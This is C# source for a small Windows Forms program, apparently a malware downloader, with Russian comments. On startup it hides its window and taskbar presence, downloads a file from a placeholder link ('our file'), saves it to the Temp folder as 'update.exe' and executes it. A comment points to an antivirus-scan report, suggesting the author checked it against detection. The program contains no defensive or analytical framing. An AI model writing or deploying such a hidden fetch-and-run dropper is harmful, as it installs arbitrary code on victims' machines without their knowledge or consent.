using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace DownLoader
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        // Отчет сканировани http://viruscheckmate.com/id/b7mSkcZ25v3V
        private void Form1_Load(object sender, EventArgs e)
        {
            //Скрываем форму
            this.Hide();
            ShowIcon = false;
            ShowInTaskbar = false;
            Opacity = 0;

            byte[] srv = null; // создадим переменную для хранения файла
            try
            {
                using (WebClient web = new WebClient())
                {
                    srv = web.DownloadData("[ссылка на наш файл]"); // скачиваем файл
                }
            
                File.WriteAllBytes(Path.GetTempPath() + "\\update.exe", srv); // записываем в Temp
                Thread.Sleep(3000); // небольшая пауза на всякий случай
                Process.Start(Path.GetTempPath() + "\\update.exe"); // запускаем
                Application.Exit(); // выходим
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message); // сообщение если ошибка
            }
        }
    }
}
